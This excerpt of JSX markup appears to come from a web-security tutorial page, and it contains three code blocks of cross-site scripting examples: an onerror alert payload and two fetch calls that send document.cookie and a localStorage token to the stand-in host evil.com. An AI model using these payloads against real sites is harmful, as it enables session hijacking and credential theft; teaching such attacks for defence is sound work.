...
<CodeBlock
  ...
  codeInstances={[
    {
      code: `<img src="https://example.com/evil.png" onerror="alert('XSS!')" />`,
      label: 'html',
      language: 'html'
    }
  ]}
...
<CodeBlock
  ...
  codeInstances={[
    {
      code: "fetch('https://evil.com/steal-cookie?cookie=' + document.cookie)",
      label: 'javascript',
      language: 'js'
    }
  ]}
...
<CodeBlock
  ...
  codeInstances={[
    {
      code: "fetch('https://evil.com/steal-token?token=' + localStorage.getItem('token'))",
      label: 'javascript',
      language: 'js'
    }
  ]}
